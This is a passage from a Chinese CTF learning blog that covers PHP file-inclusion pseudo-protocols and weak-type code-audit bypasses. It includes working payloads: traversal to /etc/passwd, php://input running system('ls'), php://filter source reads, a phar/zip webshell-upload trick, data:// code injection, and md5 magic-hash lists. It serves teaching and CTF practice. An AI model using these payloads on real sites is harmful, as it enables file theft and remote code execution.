class="language-powershell" data-language="powershell"><code class="language-powershell">https:<span class="token operator">/</span><span class="token operator">/</span>537363ba<span class="token operator">-</span>ba6d<span class="token operator">-</span>47cf<span class="token operator">-</span>b6f4<span class="token operator">-</span>85e7986ffa04<span class="token punctuation">.</span>chall<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>?url=<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd</code></pre><p>etc和passwd这两个是linux系统中的文件。至于为什么构造这个，我不是很清楚，看过linux入门书籍，所以多少知道一点，《linux就该这样学》已看完。博客后续发。<br><img src="https://img-blog.csdnimg.cn/20200520134105138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后就是伪协议，构造</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">https:<span class="token operator">/</span><span class="token operator">/</span>537363ba<span class="token operator">-</span>ba6d<span class="token operator">-</span>47cf<span class="token operator">-</span>b6f4<span class="token operator">-</span>85e7986ffa04<span class="token punctuation">.</span>chall<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>?url=php:<span class="token operator">/</span><span class="token operator">/</span>input</code></pre><p>抓包，到Repeater。自己构造相关命令执行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ls是linux系统中列出当前目录下的文件的命令。至于system是有关一个命令执行漏洞，在我的学习命令执行漏洞的博客中有记录。<br><img src="https://img-blog.csdnimg.cn/20200520133332295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后看到了ctf_go_go_go文件，然后使用命令cat 来查看文件内容。<br><img src="https://img-blog.csdnimg.cn/20200520135439422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>flag查到。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>主要用于读取源代码并进行base64编码输出。<br>使用方法payload</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">php:<span class="token operator">/</span><span class="token operator">/</span><span class="token keyword">filter</span><span class="token operator">/</span>read=convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource=upload<span class="token punctuation">.</span>php</code></pre><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p>file://协议在双off的情况下也是可以正常使用的。</p><pre class="language-php" data-language="php"><code class="language-php">allow_url_fopen ：off<span class="token operator">/</span>onallow_url_include：off<span class="token operator">/</span>on</code></pre><p>file://用于访问本地文件系统，在CTF中常用来读取本地文件。</p><p>使用方法：file://文件的绝对路径和文件名。</p><pre class="language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200520141256329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀</p><pre class="language-php" data-language="php"><code class="language-php">xxx<span class="token punctuation">.</span><span class="token function">php</span><span class="token punctuation">(</span>木马<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>压缩<span class="token operator">-</span><span class="token operator">></span><span class="token property">xxx</span><span class="token punctuation">.</span>zip<span class="token operator">-</span><span class="token operator">></span>改后缀<span class="token operator">-</span><span class="token operator">></span><span class="token property">xxx</span><span class="token punctuation">.</span>jpg<span class="token operator">-</span><span class="token operator">></span>上传<span class="token operator">-</span><span class="token operator">></span><span class="token property">phar</span><span class="token punctuation">:</span><span class="token comment">//xx.jpg/xxx.php</span></code></pre><p>与文件上传相结合。</p><h2 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h2><p>在<code>allow_url_fopen</code>，<code>allow_url_include</code>都关闭的情况下可以正常使用，</p><pre class="language-Bash" data-language="Bash"><code class="language-Bash">file.php?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]file.php?file&#x3D;zip:&#x2F;&#x2F;nac.jpg#nac.php  其中get请求中#需要进行编码，即%23</code></pre><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://：需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用，使用如下：</p><pre class="language-Bash" data-language="Bash"><code class="language-Bash">file.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;file.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;file.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;file.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</code></pre><p>还是那个例题：<br><img src="https://img-blog.csdnimg.cn/20200520141105196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h1 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h1><p>是否截断要考虑php的版本问题，PHP版本为&gt;=5.2 具体为5.2，5.3，5.5，7.0；不能使用%00截断。<br>PHP版本&lt;=5.2 可以使用%00进行截断。</p><pre class="language-shell" data-language="shell"><code class="language-shell">情况一：不需要截断：http://127.0.0.1/test.php?file<span class="token operator">=</span>file:///c:/users/Thinking/desktop/flag.txt<span class="token operator">&lt;</span>?phpinclude<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>?<span class="token operator">></span>情况二：需要截断：在php版本<span class="token operator">&lt;</span><span class="token operator">=</span><span class="token number">5.2</span>中进行测试是可以使用%00截断的。http://127.0.0.1/test.php?file<span class="token operator">=</span>file:///c:/users/Thinking/desktop/flag.txt%00<span class="token operator">&lt;</span>?phpinclude<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>.’.php’<span class="token punctuation">)</span>?<span class="token operator">></span></code></pre><p>文末寄语：</p><blockquote><p>我觉得生命是最重要的，所以在我心里，没有事情是解决不了的。不是每一个人都可以幸运地过自己理想中的生活，有楼有车当然好了，没有难道哭吗？所以呢，我们一定要享受我们所过的生活。        —— 《新不了情》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计————弱类型</title>
      <link href="/posts/d3a2c2b7/"/>
      <url>/posts/d3a2c2b7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在开始接触代码审计类型的题了，学长给我们讲过了bugku的一些题，然后我看了一些其他的社区的文章和博客，学习了简单的php代码审计，并在学习过后做几道相关的题来熟悉套路。</p><h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><h2 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h2><p>首先关于变量覆盖有这么一段简单代码可以说明（简单明了）</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'lalala'</span><span class="token punctuation">;</span><span class="token variable">$lalala</span><span class="token operator">=</span><span class="token single-quoted-string string">'xixixi'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>输出结果是<code>xixixi</code><br>再看看一个有漏洞的代码，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//让浏览器能读懂</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'aa'</span><span class="token punctuation">;</span><span class="token variable">$aa</span><span class="token operator">=</span><span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'第一次变量aa的值是'</span><span class="token punctuation">.</span><span class="token variable">$aa</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'第二次变量aa的值是'</span><span class="token punctuation">.</span><span class="token variable">$aa</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/2020042110023254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>extract()</code>函数的作用：<br><img src="https://img-blog.csdnimg.cn/20200421101503634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"><br>至于extract()变量覆盖就是两者综合。</p><h2 id="例题实战"><a href="#例题实战" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/2020042110193812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>php代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token single-quoted-string string">'xxx'</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shiyan</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$shiyan</span><span class="token operator">==</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token single-quoted-string string">'flag&#123;xxx&#125;'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token single-quoted-string string">'Oh.no'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>学习过程中参考其他师傅的博客，然后发现有师傅尝试构造了<code>?shiyan=1&amp;flag=1</code>，看起来是没错，但是flag没有显示出来。原因是变量覆盖的定义弄混淆了，覆盖的话，会覆盖<strong>数组中的同名元素会覆盖</strong>，那flag里，不只有数字吧，所以这样构造不行，也不能构造字母，那样也显示不出来，所以直接构造空，不用管flag里面是什么类型。<br><img src="https://img-blog.csdnimg.cn/20200421104922776.png" alt="Augenstern" loading="lazy"><br>看出flag是有字母，有数字，还有杠。<br>还有一个大佬写的博客呢是这样的，先看题目代码。<br><img src="https://img-blog.csdnimg.cn/20200421105047738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题的话，那位师傅直接构造<code>?gift=a&amp;flag=a</code>可以直接显示出来，为什么呢，就是因为这道题的flag全是字母。<br>因为我不知道这道题，所以就拿那个师傅的图记录一下，下面有这个师傅的博客的链接。<br><img src="https://img-blog.csdnimg.cn/20200421105610834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>因为flag里都是字母，所以可以那样构造。这里放上那个师傅的博客<a href="https://blog.51cto.com/12332766/2120865">51cto师傅博客</a></p><h1 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h1><h2 id="知识了解-1"><a href="#知识了解-1" class="headerlink" title="知识了解"></a>知识了解</h2><p>strcmp(string $str1,string $str2);<br>如果str1&gt;str2返回&gt;0，如果str1&lt;str2,返回&lt;0，如果str1=str2，返回0。<br><img src="https://img-blog.csdnimg.cn/20200421111427534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"></p><h2 id="例题实战-1"><a href="#例题实战-1" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421113859755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>比较两个字符串大小，可以传入非字符串，直接传一个数组就行了。<br><code>strcmp()</code>漏洞理解：<br>strcmp()要求传入字符串，如果传入的不是字符串，那么函数就会报错，返回return 0；这里虽然报错了，但是却让其函数值相等了。让flag显示出来了。<br><img src="https://img-blog.csdnimg.cn/20200421114336649.png" alt="Augenstern" loading="lazy"></p><h1 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h1><h2 id="知识了解-2"><a href="#知识了解-2" class="headerlink" title="知识了解"></a>知识了解</h2><p><code>urldecode()</code>函数是对一个字符串(一般是URL字符串)进行解码。<br><img src="https://img-blog.csdnimg.cn/20200421123558244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="例题实战-2"><a href="#例题实战-2" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421124401977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hackerDJ"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"hackerDJ"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Access granted!"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>使用<code>$_GET</code>时，浏览器就已经把<code>hakerDJ</code>进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。<br>再看代码逻辑是如果id=hackerDJ会返回not allowed。但是，要想得到flag，还是要让id=hackerDJ。绕过要进行二次编码。<br>字符串中随便一个字母，我选的是第一个h<br>所以找到它的URL编码格式<br><img src="https://img-blog.csdnimg.cn/20200421130953694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后再次对<code>%68</code>进行编码<br>是<code>%2568</code>，然后构造</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">%</span><span class="token number">2568</span>ackerDJ</code></pre><p><img src="https://img-blog.csdnimg.cn/20200421131309820.png" alt="Augenstern" loading="lazy"></p><h1 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h1><h2 id="知识了解-3"><a href="#知识了解-3" class="headerlink" title="知识了解"></a>知识了解</h2><p><img src="https://img-blog.csdnimg.cn/20200421132115166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自w3school" loading="lazy"><br>php中MD5函数漏洞：<br>第一种：数组绕过</p><blockquote><p>在PHP中，MD5是不能处理数组的，md5(数组)会返回null</p></blockquote><p>第二种：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>常见的被MD5认成是0的几个字符串<br>纯数字类</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">240610708</span> 0e462097431906509019562988736854<span class="token number">314282422</span> 0e990995504821699494520356953734<span class="token number">571579406</span> 0e972379832854295224118025748221<span class="token number">903251147</span> 0e174510503823932942361353209384<span class="token number">1110242161</span> 0e435874558488625891324861198103<span class="token number">1320830526</span> 0e912095958985483346995414060832<span class="token number">1586264293</span> 0e622743671155995737639662718498<span class="token number">2302756269</span> 0e250566888497473798724426794462<span class="token number">2427435592</span> 0e067696952328669732475498472343<span class="token number">2653531602</span> 0e877487522341544758028810610885<span class="token number">3293867441</span> 0e471001201303602543921144570260<span class="token number">3295421201</span> 0e703870333002232681239618856220<span class="token number">3465814713</span> 0e258631645650999664521705537122<span class="token number">3524854780</span> 0e507419062489887827087815735195<span class="token number">3908336290</span> 0e807624498959190415881248245271<span class="token number">4011627063</span> 0e485805687034439905938362701775<span class="token number">4775635065</span> 0e998212089946640967599450361168<span class="token number">4790555361</span> 0e643442214660994430134492464512<span class="token number">5432453531</span> 0e512318699085881630861890526097<span class="token number">5579679820</span> 0e877622011730221803461740184915<span class="token number">5585393579</span> 0e664357355382305805992765337023<span class="token number">6376552501</span> 0e165886706997482187870215578015<span class="token number">7124129977</span> 0e500007361044747804682122060876<span class="token number">7197546197</span> 0e915188576072469101457315675502<span class="token number">7656486157</span> 0e451569119711843337267091732412</code></pre><p>大写字母类：</p><pre class="language-bash" data-language="bash"><code class="language-bash">QLTHNDT 0e405967825401955372549139051580QNKCDZO 0e830400451993494058024219903391EEIZDOI 0e782601363539291779881938479162TUFEPMC 0e839407194569345277863905212547UTIPEZQ 0e382098788231234954670291303879UYXFLOI 0e552539585246568817348686838809IHKFRNS 0e256160682445802696926137988570PJNPDWY 0e291529052894702774557631701704ABJIHVY 0e755264355178451322893275696586DQWRASX 0e742373665639232907775599582643DYAXWCA 0e424759758842488633464374063001GEGHBXL 0e248776895502908863709684713578GGHMVOE 0e362766013028313274586933780773GZECLQZ 0e537612333747236407713628225676NWWKITQ 0e763082070976038347657360817689NOOPCJF 0e818888003657176127862245791911MAUXXQC 0e478478466848439040434801845361MMHUWUV 0e701732711630150438129209816536</code></pre><p>第三种：“0E”绕过<br>一些哈希后0E开头的字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020<span class="token number">240610708</span> 0e462097431906509019562988736854<span class="token number">314282422</span> 0e990995504821699494520356953734<span class="token number">571579406</span> 0e972379832854295224118025748221<span class="token number">903251147</span> 0e174510503823932942361353209384<span class="token number">1110242161</span> 0e435874558488625891324861198103<span class="token number">1320830526</span> 0e912095958985483346995414060832<span class="token number">1586264293</span> 0e622743671155995737639662718498<span class="token number">2302756269</span> 0e250566888497473798724426794462<span class="token number">2427435592</span> 0e067696952328669732475498472343<span class="token number">2653531602</span> 0e877487522341544758028810610885<span class="token number">3293867441</span> 0e471001201303602543921144570260<span class="token number">3295421201</span> 0e703870333002232681239618856220<span class="token number">3465814713</span> 0e258631645650999664521705537122<span class="token number">3524854780</span> 0e507419062489887827087815735195<span class="token number">3908336290</span> 0e807624498959190415881248245271<span class="token number">4011627063</span> 0e485805687034439905938362701775<span class="token number">4775635065</span> 0e998212089946640967599450361168<span class="token number">4790555361</span> 0e643442214660994430134492464512<span class="token number">5432453531</span> 0e512318699085881630861890526097<span class="token number">5579679820</span> 0e877622011730221803461740184915<span class="token number">5585393579</span> 0e664357355382305805992765337023<span class="token number">6376552501</span> 0e165886706997482187870215578015<span class="token number">7124129977</span> 0e500007361044747804682122060876<span class="token number">7197546197</span> 0e915188576072469101457315675502<span class="token number">7656486157</span> 0e451569119711843337267091732412QLTHNDT 0e405967825401955372549139051580QNKCDZO 0e830400451993494058024219903391EEIZDOI 0e782601363539291779881938479162TUFEPMC 0e839407194569345277863905212547UTIPEZQ 0e382098788231234954670291303879UYXFLOI 0e552539585246568817348686838809IHKFRNS 0e256160682445802696926137988570PJNPDWY 0e291529052894702774557631701704ABJIHVY 0e755264355178451322893275696586DQWRASX 0e742373665639232907775599582643DYAXWCA 0e424759758842488633464374063001GEGHBXL 0e248776895502908863709684713578GGHMVOE 0e362766013028313274586933780773GZECLQZ 0e537612333747236407713628225676NWWKITQ 0e763082070976038347657360817689NOOPCJF 0e818888003657176127862245791911MAUXXQC 0e478478466848439040434801845361MMHUWUV 0e701732711630150438129209816536</code></pre><h2 id="例题实战-3"><a href="#例题实战-3" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421142732601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'flag&#123;test&#125;'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token single-quoted-string string">'Your password can not be your username.'</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token single-quoted-string string">'Invalid password'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>==</code>等于，只需要等号两边的值是否相等。比如‘1’==1就成立，返回true。<br><code>===</code>全等，需要全等号两边的值和类型全都相等才成立。<br>这道题需要username和password全等但是username又不能等于password。比较矛盾，多看几遍理解还是比较容易理解的。<br>数组绕过：构造<code>?username[]=1&amp;password[]=2</code><br><img src="https://img-blog.csdnimg.cn/2020042113335981.png" alt="Augenstern" loading="lazy"></p><h1 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h1><h2 id="知识了解-4"><a href="#知识了解-4" class="headerlink" title="知识了解"></a>知识了解</h2><ul><li>ereg — 